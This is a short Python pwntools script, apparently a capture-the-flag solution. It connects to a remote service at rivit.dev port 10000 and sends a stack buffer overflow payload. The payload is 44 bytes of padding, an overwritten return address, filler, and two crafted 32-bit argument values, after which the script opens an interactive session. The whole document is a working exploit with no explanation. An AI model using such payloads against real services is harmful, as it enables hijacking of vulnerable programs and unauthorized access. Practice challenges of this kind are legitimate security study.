from pwn import *

r = remote("rivit.dev", 10000)

time.sleep(2)
payload = b'A'*44
payload += b'\xd6\x91\x04\x08'
payload += b'B'*4
payload += b'\xc7\xfa\xff\xff'
payload += b'\xee\xff\xc0\x00'

r.sendline(payload)
r.interactive()